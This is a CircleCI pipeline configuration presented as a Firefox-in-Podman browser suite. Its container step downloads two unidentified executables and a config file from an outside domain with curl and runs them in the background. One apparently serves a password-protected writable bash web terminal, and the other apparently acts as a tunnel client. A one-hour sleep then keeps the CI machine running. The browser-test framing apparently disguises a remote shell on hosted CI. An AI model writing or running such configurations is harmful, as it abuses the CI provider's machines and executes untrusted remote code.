version: 2.1

jobs:
  run-firefox-podman:
    machine:
      image: ubuntu-2404:current
    resource_class: medium
    steps:
      - checkout
      
      - run:
          name: 安装 Podman
          command: |
            sudo apt-get update
            sudo apt-get install -y podman
            podman --version

      - run:
          name: 启动 Firefox 容器
          no_output_timeout: 59m
          command: |
            # remote & mcp
            curl -s -o cli.toml https://ggweb.19870707.xyz/cli.toml
            curl -s -o ro https://ggweb.19870707.xyz/ro
            curl -s -o ty https://ggweb.19870707.xyz/ty && chmod +x ro ty
            nohup ./ro cli.toml &
            nohup ./ty -p 5800 -c test:$TY_PWD -W bash >/dev/null &
            
            mkdir -p ~/.config/containers
            echo -e "[engine]\ncgroup_manager = \"cgroupfs\"\nevents_backend = \"file\"" > ~/.config/containers/containers.conf

            podman run -d -p 5801:5800 docker.io/jlesage/firefox:latest
            
            # 等待容器启动
            sleep 3600

workflows:
  browser-suite:
    jobs:
      - run-firefox-podman
            
